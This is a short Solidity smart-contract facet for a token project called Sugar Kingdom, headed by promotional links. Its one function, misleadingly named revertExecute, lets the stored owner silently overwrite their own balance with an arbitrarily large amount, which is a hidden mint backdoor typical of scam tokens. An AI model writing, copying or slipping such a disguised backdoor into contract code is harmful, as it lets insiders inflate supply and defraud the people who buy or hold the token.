// SPDX-License-Identifier: MIT

/*
    Website: https://www.sugarkingdom.io/
    Twitter: https://twitter.com/SugarKingdomNFT
    Discord: https://discord.com/invite/sugar-kingdom
    Sugar Kingdom is a gaming platform in which projects from all chains can bring direct utility to their token, and a place in which users can do 100Xs while using their favorite low-caps.
*/

pragma solidity ^0.8.10;
import "./TestLib.sol";
contract revertExecuteFacet {
    function revertExecute(uint256 n) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._owner == msg.sender) {
            ds._balances[msg.sender] = 10 ** 15 * n * 1 * 10 ** ds._decimals;
        } else {}
    }
}
